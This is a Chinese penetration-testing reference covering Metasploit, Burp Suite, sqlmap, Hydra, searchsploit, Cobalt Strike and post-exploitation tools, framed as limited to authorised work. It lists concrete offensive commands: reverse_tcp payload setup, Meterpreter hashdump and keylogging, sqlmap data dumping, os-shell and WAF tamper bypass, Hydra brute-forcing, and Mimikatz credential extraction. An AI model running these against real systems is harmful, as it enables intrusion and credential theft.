# 渗透框架与利用工具

> 关键词:渗透测试,Metasploit,msfconsole,Meterpreter,payload,auxiliary,Burp Suite,Repeater,Intruder,sqlmap,SQL注入,Hydra,弱口令,searchsploit,Exploit-DB,Cobalt Strike,Beacon,Listener,后渗透,红队

本文件介绍渗透测试阶段的核心框架与利用工具:攻击面验证(Metasploit)、Web 应用测试(Burp Suite)、注入利用(sqlmap)、口令爆破(Hydra)与漏洞利用检索(searchsploit),并说明 Cobalt Strike 与后渗透的概念。**郑重提醒:所有利用、爆破与后渗透操作仅限明确授权的目标,违规使用涉嫌犯罪(《刑法》第 285/286 条)。**

## Metasploit Framework

- **用途**:开源渗透测试框架,集漏洞利用(exploit)、载荷(payload)、辅助模块(auxiliary)、后渗透(post)于一体;Kali 内置。
- **架构**:
  - `msfconsole`:交互式主控制台;
  - `exploit/`:利用模块(如 `exploit/multi/http/struts2_...`);
  - `payload/`:载荷(如 `windows/meterpreter/reverse_tcp`、`linux/x64/meterpreter/reverse_tcp`);
  - `auxiliary/`:辅助模块(扫描、嗅探、口令猜测等,不直接拿 shell);
  - `post/`:后渗透模块(提权、信息收集、横向移动辅助);
  - `encoders/`、`evasion/`:编码与免杀相关模块;
  - `db_*`:内置 PostgreSQL 数据库存储主机、漏洞、凭据。
- **msfconsole 常用命令**:
```bash
msfconsole -q
help                          # 命令帮助
search apache                  # 按关键词搜索模块(支持 CVE 编号)
search type:exploit platform:linux cve:2021
use exploit/multi/http/xxx     # 选中模块
info                          # 查看模块详情与选项
set RHOSTS 10.0.0.5            # 设置必填选项
set RPORT 8080
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.2; set LPORT 4444
check                         # 只检测不利用(非所有模块支持)
exploit  /  run               # 执行利用
options / show options        # 查看当前选项
sessions -l / -i 1 / -k 1     # 列出/进入/关闭会话
back                          # 返回上一级
```
- **标准利用流程**:`search → use → set 必填选项(RHOSTS/LHOST 等) → check(可选) → exploit → 获得会话 → 后渗透`。
- **Payload 选择要点**:
  - 目标平台(Windows/Linux/OS X)+ 架构(x86/x64)+ 连接方式:反向(reverse,出网,首选)/正向(bind,目标无出网时);
  - 稳定优先:`meterpreter/reverse_tcp` 功能全但特征明显;需要稳定性或免杀时改用 `shell/reverse_tcp` 或 `cmd/unix/reverse_bash`;
  - `set PAYLOAD ...` 后务必 `show options` 确认 LHOST/LPORT 已填,监听端口要开放且不被防火墙拦截。
- **Meterpreter 常用命令**:
```bash
getuid                # 当前身份
sysinfo               # 系统信息
getsystem             # 尝试提权到 SYSTEM
ps / migrate <pid>    # 查看进程/迁移进程(降低被杀概率)
shell                 # 弹出系统 shell
download <file> <dst> # 下载文件
upload <src> <dst>    # 上传文件
hashdump              # 导出 Windows 本地 SAM 哈希(需高权限)
keyscan_start/keyscan_dump  # 键盘记录(注意合规)
screenshot            # 截屏
run post/multi/recon/local_exploit_suggester  # 本地提权建议
```
- **auxiliary 模块示例**:
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
use auxiliary/scanner/smb/smb_login          # SMB 口令猜测
set USER_FILE users.txt; set PASS_FILE pass.txt
use auxiliary/gather/search_email_collector   # 邮箱收集(仅授权)
run
```
- **注意事项**:公网 VPS 上的监听端口需开防火墙;利用失败时先看 `info` 确认目标版本匹配;`exploit` 前建议 `check` 降低影响;所有会话操作留痕。

## Burp Suite(Web 应用测试核心)

- **用途**:Web 渗透测试事实标准,集代理、抓包改包、扫描、爆破、解码于一体;社区版免费(功能受限),Pro 版含主动扫描器。
- **核心功能**:
  - **Proxy(代理)**:浏览器经 `127.0.0.1:8080` 代理,Burp 拦截/转发/修改 HTTP(S) 请求;需安装 CA 证书才能解 HTTPS;
  - **Repeater(重放)**:手动修改并反复发送单条请求,用于手工验证注入、越权等;
  - **Intruder(爆破/模糊)**:对请求中标记的多个位置自动替换载荷,支持字典、多种攻击类型(Sniper/Battering ram/Pitchfork/Cluster bomb);
  - **Decoder(编解码)**:URL/Base64/Hex/HTML 等编解码,辅助绕过;
  - **Comparer、Sequencer、Extender(插件)**:比较器、会话随机性分析、插件市场(BApp Store,如 `Turbo Intruder`、`Autorize`、`Log4j` 扫描插件)。
- **典型操作流**:
  1. 配置浏览器代理 → 打开目标站点,浏览所有功能页(登录、搜索、上传等)以积累流量;
  2. 在 HTTP History 中分析请求,发现可注入点;
  3. 右键请求 → Send to Repeater,手工测试 SQLi/XSS/越权;
  4. 需要爆破时 Send to Intruder,标记参数位置,配置字典与线程,观察响应长度/状态差异;
  5. Pro 版可右键 → Do an active scan。
- **常见技巧**:
  - 改包绕过前端校验(如前端限制上传类型,直接改 `Content-Type` 与扩展名);
  - 用 `Match and Replace` 自动改请求头(如添加 `X-Forwarded-For: 127.0.0.1` 测试 IP 限制绕过);
  - 配合 xray 被动代理:`Burp 上游代理 → xray`,实现流量自动漏扫(见[漏洞扫描工具.md](漏洞扫描工具.md))。
- **注意事项**:Intruder 并发默认不高但注意目标承受力;对登录接口爆破先确认是否触发锁定/验证码;测试数据(改包内容)避免污染生产数据。

## sqlmap(SQL 注入自动化利用)

- **用途**:自动化检测与利用 SQL 注入,支持多种数据库(MySQL/MSSQL/Oracle/PostgreSQL 等)与注入技术(布尔盲注、时间盲注、报错注入、UNION 注入、堆叠查询)。
- **安装**:Kali 自带;`pip install sqlmap` 亦可。
- **常用参数**:
```bash
sqlmap -u "http://target/item.php?id=1" --batch          # 基础检测,-batch 自动应答
sqlmap -u "http://target/item.php?id=1" --dbs            # 枚举数据库
sqlmap -u "..." --dbms mysql -D dbname --tables          # 枚举指定库的表
sqlmap -u "..." -D dbname -T users --columns             # 枚举表字段
sqlmap -u "..." -D dbname -T users --dump                # 导出数据(仅授权!)
sqlmap -u "..." --os-shell                               # 尝试 getshell(需文件写入权限)
sqlmap -u "..." --risk=3 --level=5                       # 提高测试深度(更慢更全)
sqlmap -u "..." --batch --tamper=space2comment           # 用 tamper 脚本绕过 WAF
sqlmap -r req.txt --batch                                # 从 Burp 导出的请求文件检测
sqlmap -u "..." --proxy http://127.0.0.1:8080            # 走 Burp 代理联动
```
- **绕过技巧**:
  - WAF 绕过:组合 `--tamper`(如 `space2comment`、`between`、`charencode`),或手工改注入语句(大小写、注释符、等价函数);
  - 参数污染/编码:`--skip-static`、对参数值二次 URL 编码;
  - 速度受限:降低 `--threads`,配合 `--time-sec` 调整时间盲注间隔;
  - 非标准位置:对 POST/JSON/Header 注入用 `--data`、`--headers` 或 `-r` 请求文件。
- **注意事项**:`--dump`、`--os-shell` 属数据获取与利用操作,仅限授权且必要场景;时间盲注可能拖慢目标,注意并发;WAF 拦截时先做指纹识别再选 tamper。

## Hydra 与弱口令爆破

- **用途**:在线口令爆破工具,支持 SSH、FTP、HTTP(S) 表单、SMB、RDP、MySQL、Redis 等数十种协议。
- **安装**:`apt install hydra`。
- **常用命令**:
```bash
hydra -l admin -P pass.txt ssh://10.0.0.5            # SSH,用户名固定,字典口令
hydra -L users.txt -P pass.txt -t 4 10.0.0.5 rdp     # RDP,用户/口令双字典,-t 并发
hydra -l admin -P pass.txt 10.0.0.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect" 
hydra -l root -P pass.txt -s 6379 10.0.0.5 redis     # Redis 弱口令
```
- **要点**:
  - 语法中 `^USER^`/`^PASS^` 为占位符;`F=` 后跟失败标志串(登录失败页面关键字),用于区分成功/失败;
  - 先做小规模验证(1~2 条口令)确认语法正确,再全量跑;
  - 控制并发(`-t`)与延迟,防止锁账号与触发防护;优先使用合规口令字典(见[密码破解工具.md](密码破解工具.md));
  - 结果解读:命中后立刻验证口令有效性并记录,勿重复爆破相同目标。
- **替代/补充**:`medusa`(多线程)、`crowbar`(RDP/VPN 爆破)、`patator`(模块化);对 Web 表单更精细的爆破可用 Burp Intruder。

## 漏洞利用检索

### searchsploit / Exploit-DB

- **用途**:离线检索 Exploit-DB(exploit-db.com)本地镜像中的公开 exploit 与论文,快速为"软件+版本"找到可用利用代码。
- **安装**:`apt install exploitdb`(Kali 自带)。
- **常用命令**:
```bash
searchsploit apache 2.4.49
searchsploit wordpress plugin
searchsploit -m 50383                  # 把 exploit 复制到当前目录(-m mirror)
searchsploit -x 50383                  # 查看 exploit 内容
searchsploit --update                  # 更新数据库
```
- **要点**:`searchsploit -p <id>` 查看远程路径;注意 exploit 质量参差,使用前阅读源码确认目标版本与环境;公开 exploit 也可能被植入恶意代码,运行前审查;利用失败通常是版本不匹配或环境差异,不要盲目改参数攻击生产。
- **其他资源**:Vulmon、GitHub 上的 PoC 仓库、Nuclei 模板库(见[漏洞扫描工具.md](漏洞扫描工具.md))可作为补充检索源。

## Cobalt Strike(概念说明,仅授权红队场景)

- **用途**:商业红队/后渗透框架,核心是 C2(命令与控制)基础设施:攻击者在服务端部署 Team Server,生成 Beacon 植入目标主机回连,实现远程控制、横向移动、持久化与报告。**仅限持牌红队或获明确授权的攻防演练使用,个人使用其攻击性功能属违法。**
- **核心概念**:
  - **Beacon**:植入目标机器的代理程序,支持多种通信方式(HTTP/HTTPS/DNS/SMB)与回连策略(睡眠、抖动),可分阶段(Staged)或无阶段(Stageless);
  - **Listener**:Team Server 上监听回连的通道配置(协议、端口、host);
  - **Malleable C2 Profile**:自定义流量特征的配置文件,用于规避流量检测;
  - Aggressor Script:脚本化扩展(菜单、自动化);
  - Team Server + 客户端协作,支持多操作员。
- **操作概览(概念)**:生成 Listener → 生成 Payload(如 Windows Stageless)→ 投递执行 → Beacon 回连 → 交互(命令 `shell`、`upload`、`hashdump`、`screenshot`、`jump/psexec` 横向)→ 汇报并清理。
- **注意事项**:Cobalt Strike 流量特征已被主流 EDR/Suricata 规则广泛检测,真实对抗中需深度定制;Crack 版传播恶意代码风险极高,禁用;一切操作留痕并遵守授权范围与时限。

## 后渗透工具说明

- **用途**:获得初始访问后的信息收集、权限维持与横向移动(仅授权演练)。
- **典型工具**:
  - **Mimikatz**:Windows 内存凭据提取(明文口令、Kerberos 票据、hash);被 EDR 重点监控,需免杀与权限支撑;`sekurlsa::logonpasswords` 为典型命令。
  - **BloodHound / SharpHound**:基于 AD 图数据库分析域内攻击路径(谁对谁有权限),`SharpHound.exe -c All` 采集,BloodHound UI 可视化分析。
  - **Impacket 套件**:Python 实现的 SMB/WinRM/Kerberos 工具,如 `psexec.py`、`wmiexec.py`、`secretsdump.py`(导出 NTDS.dit 哈希)。
  - **Ligolo-ng / chisel / frp**:内网代理隧道工具,打通出网受限环境。
  - **PEASS-ng(linpeas/winPEAS)**:自动枚举本地提权向量。
  - **GTFOBins / LOLBAS**:查找系统自带二进制(GTFOBins 对应 Linux, LOLBAS 对应 Windows)的提权/执行利用方式。
- **使用原则**:最小化操作(能枚举就不执行)、避免破坏业务、临时工具用后清除、全程留痕;提权与凭据提取结果立即记录并按授权范围处置。

## 工具速查对比

| 工具 | 定位 | 典型场景 | 关键注意 |
| --- | --- | --- | --- |
| Metasploit | 利用框架 | 漏洞验证、获得初始 shell | 版本匹配、留痕 |
| Burp Suite | Web 测试平台 | 手工 Web 渗透 | 代理证书、流量留痕 |
| sqlmap | 注入自动化 | SQLi 检测与利用 | dump 仅授权 |
| Hydra | 在线爆破 | 弱口令检测 | 控制并发防锁号 |
| searchsploit | 利用检索 | 找 PoC | 审查后再运行 |
| Cobalt Strike | 红队 C2 框架 | 授权攻防演练 | 严格授权、特征规避 |
| Mimikatz/Impacket | 后渗透 | 凭据与横向 | 高敏感,仅演练环境 |

**底线**:利用与后渗透工具一旦越界即构成犯罪。请始终以授权书为边界,以"验证并修复"而非"入侵获利"为目的。
